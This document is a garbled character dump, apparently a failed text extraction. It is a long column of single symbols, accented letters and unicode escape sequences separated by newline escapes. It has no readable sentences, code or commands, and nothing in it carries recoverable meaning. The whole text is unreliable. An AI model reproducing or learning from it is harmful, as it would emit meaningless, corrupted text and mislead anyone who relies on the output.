ufb02\nH\n;\n\u00b1\nT\n\u00fa\n\u2021\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u00c7\nH\n\u2021\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\ufb02\n;\n\u00fa\n\u00b1\n0\n\u00f6\n>\nH\n\u00c7\n\u00fa\n\u00b3\n>\nH\n\u00bc\n\ufb02\n0\n\u00c7\n\u00fa\n\u00b3\n\u00ea\nF\nt\n\ufb02\n0\n;\n\u00c7\n\u00fa\n\u00c9\nt\n\ufb02\n0\n;\n\u00c7\n\u00fa\n\u00c9\n\u00c1\n\u00be\n\u00f8\n~\n\u00c7\nH\n\u00f3\n\u00bd\n\u00bc\n\u00f8\n~\n\u00c7\nH\n\ufb02\nH\n\u2021\n\u00eb\n\u00c9\nt\n\ufb02\n0\nw\n0\n\u00c7\nH\n\u00c7\n\u00fa\n\u00b3\n0\n\ufb02\n\u00b3\n\u00c7\n;\nH\n0\n\u2021\n;\n\ufb02\nH\nH\n\u00c7\n\u00fa\n\u00b3\n;\nH\n0\n\ufb02\n\u2030\nT\n\u2021\n\ufb02\n\u00f6\n>\n\u00e2\nw\n>\n0\n\ufb02\nt\n\u00c7\n;\n\u00c7\n~\n\u00c7\n\u00e2\n\u00c7\nH\n\u2021\n\u00fa\n;\n\u2021\n;\nH\n\ufb02\n\u00f6\n=\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n&\n,\n\u00e2\n>\n\u2030\n\u00b1\n\u00c7\n\u00e2\n\ufb02\nF\n\ufb02\n\u2021\nT\nH\n\ufb02\n>\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\nw\n\u00c7\nH\n\u00bc\n\u2021\n;\n\u2021\n0\n\u00c7\n,\nH\nF\n\ufb02\n\u2021\nT\nH\n\ufb02\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\nF\n\ufb02\n\u2021\nT\nH\n\ufb02\n;\n\u00bc\n\ufb02\n\u00e2\n\u00e2\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\nF\n\ufb02\n\u2021\nT\nH\n\ufb02\n>\n\u2030\n\u00e2\n\u00e2\n\u00ea\nt\n\u00c7\n>\n>\n\u00fa\n\ufb02\n\u00f6\n~\n\ufb02\n\u2030\n\u2030\n\ufb02\n\u2030\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n\u00eb\nl\n\ufb02\nH\n,\n0\n\u2021\n\u00c7\n\u00fa\n\u00b1\nl\n\ufb02\nH\n,\n0\n\u2021\n\ufb02\n;\n;\n\u00e2\n\u00c7\n;\nH\n\u02d9\n\ufb02\n0\n\u00f6\n\u00c7\n\u00fa\n>\nH\n\ufb02\n,\n0\n\u2021\n\ufb02\n;\n;\nl\n\ufb02\nH\n\u2030\n0\n\u00c7\nt\n\ufb02\n\u00c7\n\u00fa\n\u00b1\n l\nF\n\u02d9\n0\n\ufb02\n/\nT\n\ufb02\n;\nH\nH\n>\n&\n\u00ff\n\u00b0\n\u00fb\n\u00c9\n\u02d9\n0\n\ufb02\n/\nT\n\ufb02\n;\nH\nH\n>\n&\n\u00ff\n\u00b0\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00c2\n\u00fb\n\u00c8\n-\n-\n\ufb02\nI\n\u00b1\nI\n\u00bd\n\ufb02\n\u00c9\n1\n\u201d\n~\n>\n\u2021\n\u00dc\n\u2030\n1\n\u2021\n\u2030\n\ufb02\n\u2030\n\ufb02\n\u00e3\n\u00c8\nu\n\ufb02\n1\n\ufb02\n\u2030\n~\n\u2026\nI\n\u00bd\n\ufb02\nI\n\u00bd\n\ufb02\n\u00ba\n\u00c8\n\u2021\n1\n<\n\u00b1\nI\n\u00fb\nU\n~\n\u00e3\n\u00c8\n<\n\u00bd\n\ufb02\n1\n\u2030\n\u2021\nU\n\u00f7\n\ufb02\n\u00fb\nI\n\u02d9\n\u00bd\n\ufb02\n&\n\u00ff\n\u00b0\n\u2030\n\u00f7\n>\n\u00c8\n\u00fb\n\u00c8\n<\n>\n\u00b1\n1\n>\nU\n\u2030\nU\n\u00e3\n\ufb02\n\u00fb\nI\n\u00e3\n\u00dc\n>\n\u00e3\n\u00c8\n\u00dc\n\ufb02\n\u2030\n\u00f7\n>\n\u00c8\n\u00fb\n\u02d9\n\u00bc\n\ufb02\n0\n\ufb02\n\u00c7\n;\n>\n\u00fa\n\ufb02\nH\n\ufb02\n\u00fa\n;\n\u00c7\nt\n\ufb02\n\u2021\n\u00fa\n\u00b1\n\u00c7\n\u00b3\nT\n0\n>\nH\n\u00c7\n\u00fa\n;\n\ufb02\n\u2021\nH\n\u00c7\n\u00fa\n>\nH\nH\n\u00bc\n\ufb02\nH\n,\n\u00b1\nH\n\u00bc\n\ufb02\n;\n\u2021\n0\n\u00c7\n,\nH\n\u02d9\n\u00bc\n\ufb02\n\u00d9\n\u00f6\n,\n&\n0\n\u00e2\n\u00b0\n\u00c7\n;\nH\n,\n0\nt\n\u00c7\n\u2030\n\ufb02\n;\nH\n\u00bc\n\ufb02\n\u00c7\n\u00fa\n\u00c7\nH\n\u00c7\n>\n\u00e2\n4\n\u00e5\n4\n;\n\ufb02\n0\nt\n\ufb02\n0\n;\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\n>\n0\n\ufb02\nT\n;\n\ufb02\n\u2030\nH\n\u2030\n\ufb02\nH\n\ufb02\n0\n\u00f6\n\u00c7\n\u00fa\n\ufb02\nH\n\u00bc\n\ufb02\n;\n\ufb02\n\u2021\n\u00fa\n\u2030\n>\n0\n\u2021\n4\n\u00e5\n4\n;\n\ufb02\n0\nt\n\ufb02\n0\n>\n;\nw\n\ufb02\n\u00e2\n\u00e2\n>\n;\n>\n\u2030\n\u2030\n\u00c7\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\n;\nH\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\nH\n\u00c7\n;\nw\n0\nH\n\u00bc\n\u00fa\nH\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n>\nH\nH\n\u00bc\n\ufb02\n;\n\ufb02\n\u2021\n\u00fa\n\u2030\n>\n0\n\u2021\n4\n\u00e5\n4\n\u00f6\n>\n\u2021\n~\n\ufb02\nH\n\u00bc\n\ufb02\n;\n>\n\u00f6\n\ufb02\n>\n;\nH\n\u00bc\n\ufb02\n\u00b1\n\u00c7\n0\n;\nH\nP\n\ufb02\n\u00bc\n>\nt\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\n>\nH\nH\n>\n\u2021\n\u00db\n\ufb02\n0\n\u00f8\n\u2021\n\u00fa\nH\n0\n\u00e2\n\u00e2\n\ufb02\n\u2030\nw\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n0\n;\n\u2021\n\u00f6\n,\n0\n\u00f6\n\u00c7\n;\n\ufb02\n\u2030\nt\n\u00c7\n\u2021\nH\n\u00c7\n\u00f6\nw\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n0\n;\n>\n\u00fa\n\u2030\n\u02d9\n\ufb02\n\u2021\n\u00bc\n\u00fa\n\ufb02\nH\n>\n\u00fa\n\u2030\n\u00fb\n>\n;\nH\n\ufb02\n~\n\u00c7\n\u00fa\nw\n\ufb02\n~\n,\n>\n\u00b3\n\ufb02\n;\nT\n;\n\ufb02\n\u2030\n\u00b1\n0\nH\n\u00bc\n\ufb02\n\u00c7\n\u00fa\n\u00c7\nH\n\u00c7\n>\n\u00e2\n4\n\u00e5\n4\n\u02d9\n\u00bc\n\ufb02\n\u00c7\n\u00fa\n\u00c7\nH\n\u00c7\n>\n\u00e2\n4\n\u00e5\n4\n0\n\ufb02\n;\n,\n\u00fa\n;\n\ufb02\n\u00c7\n;\n,\n>\n0\n;\n\ufb02\n\u2030\nw\n\u00c7\nH\n\u00bc\n>\n0\n\ufb02\n\u00b3\n\ufb02\n\u02d9\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00b1\n\u00c7\n0\n;\nH\n\u00e2\n\u00db\n;\n\u00b1\n0\nH\n\u00bc\n\ufb02\n;\n\ufb02\n\u2021\n\u00fa\n\u2030\n>\n0\n\u2021\n\ufb02\n\u00fa\n\u2021\n\u2030\n\ufb02\n\u2030\n4\n\u00e5\n4\n;\n\ufb02\n0\nt\n\ufb02\n0\nT\n;\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n\u00d9\n\u00f6\n,\n\u00ff\n\ufb02\n\u00b3\n\ufb02\n0\n\ufb02\n\u00b3\n\ufb02\n\u00be\n\ufb02\nH\nH\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00e2\n\u00db\n;\n\u00b1\n0\n>\n\u2030\n\u2030\n\u00c7\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u2021\n\u2030\n\ufb02\nH\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\nT\n;\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00ff\n\ufb02\n\u00b3\n\ufb02\n0\n\ufb02\n\u00b3\n\ufb02\nj\n0\n>\n\u2030\n\u2030\n\u00c7\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u2021\n\u2030\n\ufb02\nw\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\n;\n\u00c7\n\u00f6\n,\n\u00e2\n\ufb02\n\u2021\n\u2030\n\ufb02\n~\n\u00e2\n\u2021\n\u00db\n;\nH\n\u00bc\n>\nH\n,\n0\nt\n\u00c7\n\u2030\n\ufb02\n>\n\u2030\n\u00c7\n\u00b1\n\u00b1\n\ufb02\n0\n\ufb02\n\u00fa\nH\nT\n,\n\u00e2\n>\n\u2030\n\u00f3\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u00b1\nT\n\u00fa\n\u2021\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u00c7\nH\n\u2021\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00c3\n\u02d9\n\u00bd\n\ufb02\n\ufb02\n\u00fb\n\u2021\n\u2030\n\ufb02\n\u2030\n1\n\ufb02\n<\n-\n\u00fb\n<\n\ufb02\nu\n\u2021\n\u00f7\n\u00fe\n\u2022\n\u00c3\nF\n\u00b0\n\u00b4\n\u02d9\n\u2026\n\u02d9\n\u2026\n\u00c9\nM\nu\n<\n\u00f7\n\u00c9\nx\n1\n0\n\u00a9\nx\n1\n>\nj\nx\n\u00ca\nM\nj\nx\n4\nU\n\u00b0\n\u00c8\n\u00fb\nI\n\u00bd\n\ufb02\n\u00c8\n\u00f7\n>\n\u00b4\n\ufb02\n>\n~\nu\n\ufb02\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n<\nI\n\u00bd\n\u2022\n\u2022\n-\n\u00e9\n\u00e9\nx\nx\nx\nu\n\u00c8\nI\n>\n\u00f7\n\u00c8\n\u00fb\n\u00f7\n>\n\u00c8\n\u00fb\n\u00e2\n\u00e3\n\u00c8\n\u00fb\n\u00b1\nx\n\u00bd\n\u00c8\n\u2021\n\u00bd\n\u00c8\n<\nI\n\u00bd\n\ufb02\n<\n\ufb02\n\u2021\n\u00fb\n\u2030\n>\n1\n\u2026\n4\n\u00db\n4\n<\n\ufb02\n1\nu\n\ufb02\n1\n\u00b1\n1\n>\n\u00fb\n\u00e3\n\u2030\n\ufb02\n1\n~\n>\n\u2021\n\u00dc\n\u2030\n1\nu\n>\n1\n\u00c8\n>\n\u00fb\nI\n\u00e0\n=\n\ufb02\n\u2021\n\u2030\n\ufb02\n1\n-\n1\nu\n\u00c8\n\u2030\n\ufb02\n\u2030\n\u00c8\n\u00fb\n-\n-\n\ufb02\n\u00fb\n\u2030\n\u00c8\n\u2022\n\u00e1\n\u00ba\n\u2021\n\u00dc\n=\n\u00e3\n\u00e3\n\u00f6\n\ufb02\nt\n\ufb02\n0\n;\n\u00c7\n\u00fa\n;\n\u00b1\nH\n\u00bc\n\ufb02\n\u00c9\n0\n\u201c\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00bc\n>\nt\n\ufb02\n\u00bd\n\u00bc\n\u00f8\n>\n\u00fa\n\u2030\n\u00c1\n\u00be\n\u00f8\n~\n\u00c7\nH\n\ufb02\n\u00f6\n~\n\ufb02\n\u2030\n\u2030\n\ufb02\n\u2030\n=\n\u00b0\n\u00b0\n;\n;\nH\n0\n\ufb02\n\u2030\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\u00fa\n>\n\u00e2\n\u00e2\n\u2021\n>\n;\n~\n>\n;\n\ufb02\n\u00c1\n\u00be\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n;\n\u02d9\n\u00bc\n\ufb02\n\u00c7\n0\n,\nT\n0\n,\n;\n\ufb02\n\u00c7\n;\nH\n;\n\u00c7\n\u00f6\n,\n\u00e2\n\u2021\n0\nT\n\u00fa\n>\n\u00fa\nH\n\u00bc\n\ufb02\n0\n~\n\u00c7\n\u00fa\n>\n0\n\u2021\n\u02d9\n\u00bc\n\ufb02\n;\n\ufb02\n>\n0\n\ufb02\nT\n;\n\ufb02\n\u2030\n>\n;\n\u00e2\n>\n\u2030\n\ufb02\n0\n;\n\u00b1\n0\n\u00b1\nT\nH\nT\n0\n\ufb02\n\ufb02\n\ufb02\n\u2021\nT\nH\n>\n~\n\u00e2\n\ufb02\n,\n>\n\u2021\n\u00e2\n>\n\u2030\n;\nT\n;\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\nw\n\ufb02\n\u00e2\n\u00e2\n\u00f8\n\u00db\n\u00fa\nw\n\u00fa\n,\n0\n\u2021\n\ufb02\n;\n;\n\u00bc\n\u00e2\n\u00e2\nw\n\u00c7\n\u00fa\n\u00b3\nH\n\ufb02\n\u2021\n\u00bc\n\u00fa\n\u00c7\n/\nT\n\ufb02\n\u02d9\nT\n;\n\ufb02\nH\n\u00bc\n\ufb02\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\nH\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u2021\n0\n\ufb02\n>\nH\n\ufb02\n;\n>\n\u2021\n\u00fa\n\u00b1\n\u00c7\n\u00b3\nT\n0\n>\nH\n\u00c7\n\u00fa\n\u00c7\n\u00fa\n\u00c7\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n \u00e2\n\u00c7\n\u00db\n\ufb02\nH\n\u00bc\n>\nH\n;\n\u00bc\nw\n\u00fa\n\u00c7\n\u00fa\nj\n\u00c7\n\u00b3\nT\n0\n\ufb02\n\u00bb\n\u00be\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00c4\n\u00ba\n\u2021\n\u00dc\n=\n\u00e3\n\u00e3\n\u2021\n\u00fb\n\u00b1\n\u00c8\n\u00b4\nU\n1\n>\nI\n\u00c8\n\u00fb\n\u00b1\n\u00c8\n\u00e3\n\ufb02\n\u00f6\n\u2021\n\u00db\n\u2030\n\ufb02\n\u00b1\n>\nT\n\u00e2\nH\n;\nH\n0\n\ufb02\n\u00b3\n;\nt\n0\n\u00bd\n\u00bc\n0\n\ufb02\n>\n\u00e2\nH\n\u00bc\n\ufb02\n\u2030\n\u00e2\n\u00e2\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\n\u00c7\n;\nH\n\u00bc\n\ufb02\nT\n\u00e2\nH\n\u00c7\n\u00f6\n>\nH\n\ufb02\n\u00b3\n>\n\u00e2\nH\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\n>\n0\n\u00b3\n;\n>\n0\n\u00b3\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nH\nH\n\u00bc\n\ufb02\n\u2030\n\u00e2\n\u00e2\nH\n\u00bc\n>\nH\nw\n\u00c7\n\u00e2\n\u00e2\n~\n\ufb02\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\n\u2030\n\u00c7\n\u00b1\n>\n\u00fa\n\u2021\nT\nH\n\u00b1\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00c7\n\u00fa\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\nH\nw\n0\n\u00c7\nH\n\ufb02\n0\n\ufb02\n;\nT\n\u00e2\nH\n;\n\u00b1\nH\n\u00bc\n\ufb02\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n0\nT\n\u00fa\nH\n\u00c7\n\u00f6\n\ufb02\nH\n\u00c7\n\u00f6\n\ufb02\nT\nH\n\u2030\n\ufb02\n\u00b1\n>\nT\n\u00e2\nH\n;\nH\n\u00c0\n\u00b1\nH\n\ufb02\n0\nH\n\u00bc\n\ufb02\n\u2021\n\u00fa\n\u00b1\n\u00c7\n\u00b3\nT\n0\n>\nH\n\u00c7\n\u00fa\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00c7\n;\n\u2021\n0\n\ufb02\n>\nH\n\ufb02\n\u2030\nH\n\u00bc\n\ufb02\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n\u00c7\n;\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\n\u2030\nw\n\u00c7\nH\n\u00bc\n0\n\ufb02\n\u00b3\n;\nt\n0\n\u00bd\n\u00bc\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n0\n\ufb02\n>\n\u2030\n;\nH\n\u00bc\n\ufb02\n\u00f6\n\ufb02\n\u00fa\nH\n\u00c7\n\u00fa\n\ufb02\n\u2030\n\u00c7\n\u00fa\n\u00c7\n\u2021\n\u00fa\n\u00b1\n\u00c7\n\u00b3\n\u00b1\n\u00c7\n\u00e2\n\ufb02\nH\n\u2030\n\ufb02\nH\n\ufb02\n0\n\u00f6\n\u00c7\n\u00fa\n\ufb02\nw\n\u00bc\n>\nH\nH\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\nH\n\u2021\n>\n\u00fa\n\u00e2\n\u00b3\n\u00c7\nH\n;\n\ufb02\n\ufb02\n\u2021\nT\nH\n\u00c7\n\u00fa\n0\n\ufb02\n;\nT\n\u00e2\nH\n;\n\u00c7\n\u00fa\nH\n>\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n,\n\ufb02\n\u2021\n\u00c7\n\u00b1\n\u00c7\n\ufb02\n\u2030\n~\n\u2021\nH\n\u00bc\n\ufb02\nT\nH\n\u00b1\n,\n>\n0\n>\n\u00f6\n\ufb02\nH\n\ufb02\n0\n>\n;\n;\n\u00bc\nw\n\u00fa\n\u00c7\n\u00fa\nj\n\u00c7\n\u00b3\nT\n0\n\ufb02\n\u00bb\n\u00c0\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00c6\n4\n\u00fb\nI\n\ufb02\n\u00fb\nI\n<\n\u00b1\nI\n\u00bd\n\ufb02\n\u00e3\n\u00b4\n\u00b1\n\u00c8\n\u00e3\n\ufb02\n\u2021\n1\n\ufb02\n>\nI\n\ufb02\n\u2030\n~\n\u2026\n\u00ba\n\u2021\n\u00dc\n=\n\u00e3\n\u00e3\n\ufb02\n=\n\u00e3\n\u00e3\n\u02d9\n\u00bc\n\u00c7\n;\n=\n\u00b0\n\u00b0\n\u00c7\n;\nT\n;\n\ufb02\n\u2030\n\u00b1\n0\n\u2030\n\ufb02\n\u2021\n0\n\u2021\n,\nH\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\u2030\n\ufb02\n\ufb02\n\u2021\nT\nH\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\nH\n\u00bc\n\ufb02\n0\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n~\n>\n\u2021\n\u00db\n\u2030\n0\n;\nT\n\u2021\n\u00bc\n>\n;\n\u00c9\n0\n\u201c\n\u02d9\n\u00bc\n\ufb02\n=\n\u00b0\n\u00b0\n\u00c7\n;\n0\n\ufb02\n\u00b3\n\u00c7\n;\nH\n\ufb02\n0\n\ufb02\n\u2030\n~\n\u2021\nH\n\u00bc\n\ufb02\n\u00c7\n\u00fa\n;\nH\n>\n\u00e2\n\u00e2\n\ufb02\n0\nT\n;\n\u00c7\n\u00fa\n\u00b3\n0\n\ufb02\n\u00b3\n;\nt\n0\n\u00bd\n\u00bc\n\u02d9\n\u00bc\n\ufb02\n=\n\u00e2\n\u00e2\n\u00ff\n\ufb02\n\u00b3\n\u00c7\n;\nH\n\ufb02\n0\n\ufb02\n0\nt\n\ufb02\n0\n\ufb02\n,\n0\nH\n\u00c7\n;\nH\n\u00bc\n\ufb02\n\u00fa\n\u2021\n>\n\u00e2\n\u00e2\n\ufb02\n\u2030\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\n,\n\ufb02\n0\n\u00b1\n0\n\u00f6\n;\n\u2021\n\u00bc\n\ufb02\n\u2021\n\u00db\n;\n\u00fa\nH\n\u00bc\n\ufb02\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\n\u00e2\n\u00c7\n\u00fa\n\ufb02\n,\n>\n0\n>\n\u00f6\n\ufb02\nH\n\ufb02\n0\n\u00b1\nH\n\u00bc\n\ufb02\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n=\n\u00ff\n\u00c7\n;\n,\n>\n;\n;\n\ufb02\n\u2030\n>\n;\n>\n\u00fa\n>\n0\n\u00b3\nT\n\u00f6\n\ufb02\n\u00fa\nH\n0\n\u00c7\n\u00b1\nH\n\u00bc\n\ufb02\n=\n\u00b0\n\u00b0\n\u00c7\n;\n0\nT\n\u00fa\n\u00fa\n\u00c7\n\u00fa\n\u00b3\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n>\n\u2021\nH\n\u00c7\nt\n\ufb02\n;\n\ufb02\n;\n;\n\u00c7\n\u00fa\nw\n\u00c7\nH\n\u00bc\n>\nT\n;\n\ufb02\n0\n\u00fa\n>\n\u00f6\n\ufb02\nH\n\u00bc\n>\nH\n\u00c7\n;\n\u00fa\nH\n;\n\u2021\n;\nH\n\ufb02\n\u00f6\nH\n\u00bc\n\ufb02\n\u00b1\n\u00c7\n\u00fa\n>\n\u00e2\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00c7\n;\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u2030\nT\n;\n\u00c7\n\u00fa\n\u00b3\n>\n\u2021\nT\n;\nH\n\u00f6\n~\n>\n;\n\ufb02\n\u00c1\n\u00be\n>\n\u00e2\n,\n\u00bc\n>\n~\n\ufb02\nH\n\u02d9\n\u00bc\n\u00c7\n;\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00bc\n>\n;\nH\n~\n\ufb02\n,\n0\n\ufb02\n;\n\ufb02\n\u00fa\nH\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n;\n>\n\u00f6\n\ufb02\n\u2030\n\u00c7\n0\n\ufb02\n\u2021\nH\n0\n\u2021\n>\n;\nH\n\u00bc\n\ufb02\n\u2030\n\u00e2\n\u00e2\nw\n\u00c7\nH\n\u00bc\n>\nH\n\u00f6\n,\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\ufb02\nH\n\ufb02\n\u00fa\n;\n\u00c7\n\u00fa\n\u02d9\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00c7\n;\nH\n\u00bc\n\ufb02\n\u00fa\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\n\u2030\nT\n;\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n\u2021\nH\n\u00c7\nt\n\ufb02\n\u2021\n0\n\u00c7\n,\nH\n>\n\u00fa\n\u2030\n\u2021\nH\n\u00c7\nt\n\ufb02\n\u2021\n0\n\u00c7\n,\nH\n\u00fb\n>\n0\n;\n\ufb02\n\u00bd\n\u00bc\n4\n\u00c9\n\u00ba\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\u00b1\n>\n\u2021\n\ufb02\n;\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00c7\n=\n\ufb02\n\u2021\n\u2030\n\u00c8\n\u00fb\n\u00b4\n>\n\u00fb\n\u2030\n\ufb02\n\u2022\n\ufb02\n\u2021\nU\nI\n\u00c8\n\u00fb\n\u00b4\n\u00b1\nI\n\u00bd\n\ufb02\n\u00a7\n>\nu\n>\n\u2021\n1\n\u00c8\n-\nI\n~\n>\n\u2021\n\u00dc\n\u2030\n1\n\u00b1\nH\n\u00bc\n;\n\ufb02\n\u2021\n\u00fa\n\u2030\n\u00c7\nH\n\u00c7\n\u00fa\n;\n>\n0\n\ufb02\n\u00fa\nH\n\u00f6\n\ufb02\nH\n\u00c7\nH\n0\nT\n\u00fa\n;\nH\n\u00bc\n\ufb02\n\u00b1\n\u00e2\n\u00e2\nw\n\u00c7\n\u00fa\n\u00b3\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\n\u00e2\n\u00c7\n\u00fa\n\ufb02\n0\n\ufb02\n\u00b3\n;\nt\n0\n\u00bd\n\u00bc\n\u00f3\n;\n\u00f6\n\u00b1\n;\n\u00f6\n=\n\u00ff\n2\n2\n4\n\u00ba\n2\n2\nH\n0\n\ufb02\n\u00b3\n\u00c7\n;\nH\n\ufb02\n0\nH\n\u00bc\n\ufb02\n=\n\u00b0\n\u00b0\nw\n\u00bc\n\ufb02\n0\n\ufb02\n\u00b1\n;\n\u00c7\n;\nH\n\u00bc\n\ufb02\n,\n>\nH\n\u00bc\nH\nH\n\u00bc\n\ufb02\n=\n\u00b0\n\u00b0\nH\nH\n0\n\u00c7\n\ufb02\n;\nH\n\u2030\nH\n\u00bc\n\u00c7\n;\nw\n\u00c7\nH\n\u00bc\nH\n\u00bc\n\ufb02\n\u2021\nT\n0\n0\n\ufb02\n\u00fa\nH\nT\n;\n\ufb02\n0\n,\n0\n\u00c7\nt\n\u00c7\n\u00e2\n\ufb02\n\u00b3\n\ufb02\n;\n~\nT\nH\n\u00c7\n\u00b1\nH\n\u00bc\n\ufb02\n,\n0\n\u00c7\nt\n\u00c7\n\u00e2\n\ufb02\n\u00b3\n\ufb02\n;\n\u2021\n>\n\u00fa\n\u00fa\nH\n~\n\ufb02\n>\n\u2030\n\u00d9\nT\n;\nH\n\ufb02\n\u2030\n\u00c7\nH\n\u2030\n\ufb02\n\u00b1\n>\nT\n\u00e2\nH\n;\nH\nH\n\u00bc\n\ufb02\n>\nt\n>\n\u00c7\n\u00e2\n>\n~\n\u00e2\n\ufb02\n\ufb02\n\ufb02\n\u2021\nT\nH\n\u00c7\n\u00fa\n\ufb02\n\u00fa\nt\n\u00c7\n0\n\u00fa\n\u00f6\n\ufb02\n\u00fa\nH\n4\n~\n>\n\u00e3\nI\nI\n1\n\u00c8\n\u00dc\n\ufb02\n\u02d9\n\u00bc\n\u00c7\n;\n\u00c7\n;\n>\n,\n\ufb02\n\u00fa\n\ufb02\nH\n0\n>\nH\n\u00c7\n\u00fa\nH\n\ufb02\n;\nH\n\u00c7\n\u00fa\n\u00b3\nH\n\u00e2\n\u02d9\n\u00bc\n\ufb02\n>\nH\nH\n>\n\u2021\n\u00db\n\ufb02\n0\n;\n\u00b1\nH\n\ufb02\n\u00fa\n>\n~\nT\n;\n\ufb02\nH\n\u00bc\n\ufb02\n\u00b1\n0\n\ufb02\n\ufb02\nH\n0\n\u00c7\n>\n\u00e2\nt\n\ufb02\n0\n;\n\u00c7\n\u00fa\n4\n\u00fa\n\u2021\n\u00e2\nT\n;\n\u00c7\n\u00fa\n \u02d9\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\nw\n\u00bc\n;\n\ufb02\n\ufb02\n;\n,\n\u00c7\n\u00fa\n>\n\u00b3\n\ufb02\n>\n\u2021\nH\n\u00c7\nt\n\u00c7\nH\n\u00c7\n\ufb02\n;\n,\n0\n\u00c7\n\u00f6\n>\n0\n\u00c7\n\u00e2\n\u2021\n\u00b1\n\u2021\nT\n;\n\u00fa\nH\n>\n0\n\u00b3\n\ufb02\nH\n;\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n&\n>\n\u00fa\n\u2030\nP\n\ufb02\n;\nH\n\ufb02\n0\n\u00fa\nF\nT\n0\n,\n\ufb02\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\nH\n\u00c7\n\ufb02\n;\n\u00bc\n>\n;\n~\n\ufb02\n\ufb02\n\u00fa\n>\n\u2021\nH\n\u00c7\nt\n\ufb02\n;\n\u00c7\n\u00fa\n\u2021\n\ufb02\n>\nH\n\u00e2\n\ufb02\n>\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00be\n\u02d9\n\u00bc\n\ufb02\nH\n\u00e2\n;\nH\n\ufb02\n\u2021\n\u00bc\n\u00fa\n\u00c7\n/\nT\n\ufb02\n;\n>\n\u00fa\n\u2030\nH\n>\n0\n\u00b3\n\ufb02\nH\n;\n\u2021\n\u00fa\n;\n\u00c7\n;\nH\n\ufb02\n\u00fa\nH\n\u00e2\n\u2021\n\u2021\n\u00fa\n\u00fa\n\ufb02\n\u2021\nH\nH\n\u00bc\n\ufb02\n\u00c7\n0\nw\n0\n\u00db\n,\n>\n0\nH\n\u00c7\n\u2021\nT\n\u00e